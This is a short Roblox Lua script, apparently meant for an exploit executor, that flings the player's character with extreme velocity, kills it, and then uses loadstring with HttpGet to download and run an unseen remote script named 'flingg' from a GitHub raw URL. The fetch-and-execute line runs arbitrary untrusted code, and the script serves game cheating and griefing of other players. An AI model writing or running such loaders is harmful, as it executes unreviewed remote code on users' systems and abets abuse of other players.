local LocalPlayer = game.Players.LocalPlayer
local HumanoidRootPart = LocalPlayer.Character.HumanoidRootPart
local Velocity = HumanoidRootPart.AssemblyLinearVelocity

function main()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/3isht/3isht/refs/heads/master/flingg"))()
end


for i = 1, 5 do
    HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(666,666,666)
    if i == 5 then
        task.wait(1)
        LocalPlayer.Character.Humanoid.Health = 0
        task.wait(2)
        main()
    end
end
